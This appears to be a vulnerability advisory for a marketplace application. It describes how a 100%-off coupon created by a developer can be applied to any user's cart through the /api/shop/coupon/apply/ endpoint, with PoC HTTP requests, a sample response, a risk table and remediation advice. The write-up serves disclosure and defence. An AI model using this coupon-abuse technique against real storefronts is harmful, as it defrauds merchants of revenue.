# Description

Coupon abuse via cross-tenant discount application (CWE-285). The Developer Coupon Management portal `POST /developer/coupons/create/` is correctly gated by `@developer_required`. However, once a developer creates a coupon (including 100%-off coupons), the API checkout path at `Api/views_shopping.py:276-279` applies the discount to **any** user's cart without verifying the coupon's scope or the creator's tenant. A developer can create a public 100%-off coupon code that any user applies at checkout to obtain marketplace items for free.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Log in as a user with the Developer Role. | Developer access. |
| 2 | `POST /developer/coupons/create/` with `discount=100`, `min_order=0`, high max-uses. | 100%-off coupon created (no server-side cap on discount value). |
| 3 | Share the coupon code; any user applies it via `/api/shop/coupon/apply/`. | Full discount applied cross-tenant — items obtained for free. |

# PoC

Create the coupon (as a Developer):

```
POST /developer/coupons/create/
code=FREEALL100  discount_value=100  max_uses=999  min_order_amount=0
valid_until=2026-12-31
```

Apply it via the API:

```http
POST /api/shop/coupon/apply/
Content-Type: application/json
X-API-Key: <any_valid_key>

{"code": "FREEALL100"}
```

```json
{"success": true, "data": {"valid": true, "discount_amount": 36.0,
 "code": "FREEALL100", "message": "Coupon valid. Applies a discount of 36.00 Neuros."}}
```

Cart total 36.00 NE → discount 36.00 NE → net cost 0.00 NE. The public coupon (999 uses) is usable by all users.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | None directly. |
| Integrity | Complete bypass of the marketplace payment model; arbitrary public discount codes. |
| Availability | None directly. |

Overall severity: **High (integrity)** — direct revenue loss; no discount cap and no tenant scoping on coupon application.

# Remediation

1. **Cap discount percentages** server-side (e.g. max 50%) and require admin approval above a threshold.
2. **Scope coupons to the creator's own products**, and rate-limit coupon creation.
3. **Validate coupon tenant** at checkout — the API checkout path (`Api/views_shopping.py:276-279`) must verify the coupon applies to the buyer's cart context.

# Author
CPE LYON
